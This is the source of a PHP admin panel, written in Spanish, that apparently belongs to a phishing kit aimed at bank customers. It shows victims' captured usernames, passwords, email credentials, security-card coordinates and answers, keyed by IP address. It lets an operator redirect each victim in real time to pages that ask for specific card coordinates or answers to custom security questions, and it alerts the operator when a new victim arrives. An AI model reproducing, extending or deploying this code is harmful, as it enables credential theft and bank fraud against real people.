<?php
session_start();
require_once 'functions.php';

// Verificar si el usuario ha iniciado sesión
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: srefks.php");
    exit();
}

$data = load_data();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['ip']) && isset($_POST['redirect'])) {
        // Actualizar currentPage en xzw.json
        $ip = $_POST['ip'];
        $redirectPage = $_POST['redirect'];
        if (isset($data[$ip])) {
            $data[$ip]['currentPage'] = $redirectPage;
            save_data($data);
            echo json_encode(["success" => true]);
            exit();
        } else {
            echo json_encode(["success" => false, "error" => "Usuario no encontrado."]);
            exit();
        }
    }
    if (isset($_POST['ip']) && isset($_POST['quest']) && isset($_POST['quest2'])) {
        $ip = $_POST['ip'];
        $data[$ip]['quest'] = [$_POST['quest'], $_POST['quest2']];
        $data[$ip]['currentPage'] = "pregunta.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['quest3']) && isset($_POST['quest4'])) {
        $ip = $_POST['ip'];
        $data[$ip]['quest2'] = [$_POST['quest3'], $_POST['quest4']];
        $data[$ip]['currentPage'] = "pregunta2.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['coord'])) {
        // Guardar coordenadas en el JSON
        $ip = $_POST['ip'];
        $data[$ip]['coord'] = [
            $_POST['coord'],
            $_POST['coord2'],
            $_POST['coord3'],
            $_POST['coord4']
        ];
        $data[$ip]['currentPage'] = "coordenadas.php";
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
    if (isset($_POST['ip']) && isset($_POST['state'])) {
        // Actualizar el estado del usuario a block
        $ip = $_POST['ip'];
        $data[$ip]['state'] = $_POST['state'];
        save_data($data);
        echo json_encode(["success" => true]);
        exit();
    }
     // Procesar petición de eliminación de usuario
    if (isset($_POST['ip']) && isset($_POST['delete'])) {
        $ipKey = $_POST['ip'];
        if (delete_user($ipKey)) {
            echo json_encode(["success" => true]);
        } else {
            echo json_encode(["success" => false, "error" => "Usuario no encontrado."]);
        }
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        /* Contenedor para la tabla completa */
        #tablesContainer {
            width: 100%;
            overflow-x: auto;
        }
        table {
            margin: 20px auto;
            border-collapse: collapse;
            width: 90%;
            background-color: #1e1e1e;
            border-radius: 10px;
            overflow: hidden;
        }
        thead tr th {
            background-color: #333333;
            padding: 10px;
            border: 1px solid #ffffff;
            font-size: 1em;
        }
        tbody tr td {
            border: 1px solid #ffffff;
            padding: 8px;
            text-align: center;
            font-size: 0.9em;
        }
        .group-header {
            font-weight: bold;
        }
        button {
            padding: 8px;
            margin: 5px;
            background-color: #333;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            font-size: 0.8em;
        }
        button:hover {
            background-color: #555;
        }
        tr:hover {
            background-color: #4a4a4a;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 50%;
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0px 0px 10px rgba(255,255,255,0.2);
        }
        .modal input {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: none;
        }
        .close {
            float: right;
            font-size: 24px;
            cursor: pointer;
            color: white;
        }
        .close:hover {
            color: red;
        }
    </style>
</head>
<body>
    <h1>Panel de Administración</h1>
    
    <!-- Contenedor para la tabla completa -->
    <div id="tablesContainer">
        <!-- La tabla se generará dinámicamente -->
    </div>
    
    <div id="questionModal" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Preguntas</h2>
        <input type="text" id="questionInput" value="¿?" placeholder="Escriba su pregunta">
        <input type="text" id="questionInput1" value="¿?" placeholder="Escriba su pregunta">
        <button id="submitQuestion">Enviar</button>
    </div>

    <div id="questionModal2" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Preguntas</h2>
        <input type="text" id="questionInput2" value="¿?" placeholder="Escriba su pregunta">
        <input type="text" id="questionInput3" value="¿?" placeholder="Escriba su pregunta">
        <button id="submitQuestion2">Enviar</button>
    </div>
    
    <div id="coordModal" class="modal">
        <span class="close">&times;</span>
        <h2>Ingrese las Coordenadas</h2>
        <input type="text" id="coord1" placeholder="Escriba su coordenada 1">
        <input type="text" id="coord2" placeholder="Escriba su coordenada 2">
        <input type="text" id="coord3" placeholder="Escriba su coordenada 3">
        <input type="text" id="coord4" placeholder="Escriba su coordenada 4">
        <button id="submitCoord">Enviar</button>
    </div>
    
    <audio id="notificationSound">
        <source src="content/notification.mp3" type="audio/mpeg">
    </audio>
    
    <script>
        // Keys de submissions a mostrar
        const submissionColumns = ['usuario','clave','c1','c2','c3','c4','correo','clavec','r1','r2','r3','r4'];
        let previousRowCount = 0;
        let selectedIp = null;
        
        function playSound() {
            document.getElementById("notificationSound").play();
        }
        
        function copyToClipboard(text) {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text).then(() => {
                    alert('¡Copiado al portapapeles!');
                }).catch(err => {
                    alert('Error al copiar: ' + err);
                });
            } else {
                const tempInput = document.createElement('input');
                tempInput.value = text;
                document.body.appendChild(tempInput);
                tempInput.select();
                document.execCommand('copy');
                document.body.removeChild(tempInput);
                alert('¡Copiado al portapapeles!');
            }
        }
        
        // Encabezado global de la tabla
        function generateGlobalHeader(totalColumns) {
            return `<thead>
                        <tr>
                            <th colspan="${totalColumns}">Usuarios agrupados por color</th>
                        </tr>
                    </thead>`;
        }
        
        // En lugar del encabezado con nombre de grupo, se muestran los encabezados fijos (las columnas)
        function generateGroupHeader(color) {
             return `<tr style="background-color: ${color};">
                        <th>#</th>
                        <th>Página Actual</th>
                        <th>Location</th>
                        <th>Status</th>
                        <th>usuario</th>
                        <th>clave</th>   
                        <th>c1</th>
                        <th>c2</th>
                        <th>c3</th>
                        <th>c4</th>
                        <th>correo</th>
                        <th>clavec</th> 
                        <th>r1</th>
                        <th>r2</th>
                        <th>r3</th>
                        <th>r4</th>
                        <th>Acción</th>
                    </tr>`;
        }
        
        function loadUsers() {
            $.getJSON("xzw.json", function(data) {
                let users = Object.entries(data).reverse();
                let rowCount = users.length;
                if (rowCount > previousRowCount) {
                    playSound();
                }
                previousRowCount = rowCount;
                
                // Colores fijos en el orden deseado (se normaliza el negro)
                const desiredColors = ['#000000'];
                // Total de columnas: (#, Página Actual, Estado, Status, submissions..., Acción)
                const totalColumns = 4 + submissionColumns.length + 1;
                
                // Inicializar grupos para cada color
                let groups = {};
                desiredColors.forEach(color => {
                    groups[color] = [];
                });
                
                // Agrupar usuarios según su color y solo aquellos que tengan contenido en submissions
                users.forEach(([ip, user]) => {
                    let color = user.color || "#000000";
                    // Normalizar: si comienza con "##", quitar uno de los hashes
                    if (color.startsWith("##")) {
                        color = "#" + color.slice(2);
                    }
                    // Solo se agrega si tiene contenido en submissions
                    if (desiredColors.includes(color) && user.submissions && user.submissions.length > 0) {
                        groups[color].push([ip, user]);
                    }
                });
                
                // Construir la tabla completa con un <thead> global y un <tbody> para cada grupo
                let tableHTML = `<table id="userTable">`;
                tableHTML += generateGlobalHeader(totalColumns);
                
                desiredColors.forEach(color => {
                    tableHTML += `<tbody id="group-${color}">`;
                    // Se muestran los encabezados fijos en vez del nombre del grupo
                    tableHTML += generateGroupHeader(color);
                    let group = groups[color];
                    let groupIndex = 1;
                    if (group.length > 0) {
                        group.forEach(([ip, user]) => {
                            let submissionColsHTML = "";
                            submissionColumns.forEach(function(key) {
                                let submissionValue = "";
                                if (user.submissions && Array.isArray(user.submissions)) {
                                    for (let i = user.submissions.length - 1; i >= 0; i--) {
                                        let sub = user.submissions[i];
                                        if (sub.data && sub.data[key] !== undefined) {
                                            submissionValue = sub.data[key];
                                            break;
                                        }
                                    }
                                }
                                let safeValue = submissionValue.toString().replace(/'/g, "\\'");
                                submissionColsHTML += `<td><button onclick="copyToClipboard('${safeValue}')">${submissionValue || ''}</button></td>`;
                            });
                            tableHTML += `
                                <tr style="background-color: ${color};">
                                    <td>${groupIndex}</td>
                                    <td>${user.currentPage}</td>
                                      <td>${user.location ? user.location : ""}</td>
                              <td>
                          <span 
                            style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background-color: ${user.status === 'online' ? 'green' : 'red'};">
                          </span>
                          ${user.status || ''}
                        </td>
                                    ${submissionColsHTML}
                                    <td>
                                        <button onclick="redirectUser('${ip}', 'index.php')">Inicio</button>
                                        <button onclick="redirectUser('${ip}', 'correo.php')">correo</button>
                                        <button onclick="opencoordModal('${ip}')">Coordenada</button>
                                        <button onclick="openQuestionModal('${ip}')">Preguntas</button>
                                        <button onclick="openQuestionModal2('${ip}')">Preguntas 2</button>
                                        <button onclick="deleteUser('${ip}')" style="background-color:darkred;">Eliminar</button>
                                        <button onclick="blockUser('${ip}')" style="background-color:red;">Bloquear</button>
                                    </td>
                                </tr>`;
                            groupIndex++;
                        });
                    } else {
                        tableHTML += `<tr><td colspan="${totalColumns}">Sin datos</td></tr>`;
                    }
                    tableHTML += `</tbody>`;
                });
                
                tableHTML += `</table>`;
                $("#tablesContainer").html(tableHTML);
            });
        }
        
        function redirectUser(ip, page) {
            $.post("admin.php", { ip: ip, redirect: page }, function(response) {
                let res = JSON.parse(response);
                if (!res.success) {
                    alert("Error: " + res.error);
                }
            });
        }
        
        function blockUser(ip) {
            $.post("admin.php", { ip: ip, state: "block" }, function(response) {
                let res = JSON.parse(response);
                if (!res.success) {
                    alert("Error: " + res.error);
                }
            });
        }

        function deleteUser(ipKey) {
            if(confirm("¿Está seguro de eliminar este usuario?")) {
                $.post("admin.php", { ip: ipKey, delete: true }, function(response) {
                    let res = JSON.parse(response);
                    if (!res.success) {
                        alert("Error: " + res.error);
                    } else {
                        loadUsers();
                    }
                });
            }
        }
        
        function openQuestionModal(ip) {
            selectedIp = ip;
            document.getElementById("questionModal").style.display = "block";
        }
        
        function openQuestionModal2(ip) {
            selectedIp = ip;
            document.getElementById("questionModal2").style.display = "block";
        }

        function opencoordModal(ip) {
            selectedIp = ip;
            document.getElementById("coordModal").style.display = "block";
        }
        
        document.querySelector("#questionModal .close").addEventListener("click", function() {
            document.getElementById("questionModal").style.display = "none";
        });

        document.querySelector("#questionModal2 .close").addEventListener("click", function() {
            document.getElementById("questionModal2").style.display = "none";
        });
        
        document.querySelector("#coordModal .close").addEventListener("click", function() {
            document.getElementById("coordModal").style.display = "none";
        });
        
        document.getElementById("submitQuestion").addEventListener("click", function() {
            const question = document.getElementById("questionInput").value;
            const question1 = document.getElementById("questionInput1").value;
            if (!question.trim()|| !question1.trim()) {
                alert("Por favor, ingrese las preguntas.");
                return;
            }
            $.post("admin.php", { ip: selectedIp,  quest: question, quest2: question1 }, function(response) {
                document.getElementById("questionModal").style.display = "none";
            });
        });

        document.getElementById("submitQuestion2").addEventListener("click", function() {
            const question2 = document.getElementById("questionInput2").value;
            const question3 = document.getElementById("questionInput3").value;
            if (!question2.trim()|| !question3.trim()) {
                alert("Por favor, ingrese las preguntas.");
                return;
            }
            $.post("admin.php", { ip: selectedIp,  quest3: question2, quest4: question3 }, function(response) {
                document.getElementById("questionModal2").style.display = "none";
            });
        });
        
        document.getElementById("submitCoord").addEventListener("click", function() {
            const coord1 = document.getElementById("coord1").value;
            const coord2 = document.getElementById("coord2").value;
            const coord3 = document.getElementById("coord3").value;
            const coord4 = document.getElementById("coord4").value;
            if (!coord1.trim()||!coord2.trim()||!coord3.trim()||!coord4.trim()) {
                alert("Por favor, ingrese coordenada.");
                return;
            }
            $.post("admin.php", { ip: selectedIp, coord: coord1, coord2: coord2, coord3: coord3, coord4: coord4}, function(response) {
                document.getElementById("coordModal").style.display = "none";
            });
        });
        
        $(document).ready(function() {
            loadUsers();
            setInterval(loadUsers, 1000);
        });
    </script>
</body>
</html>
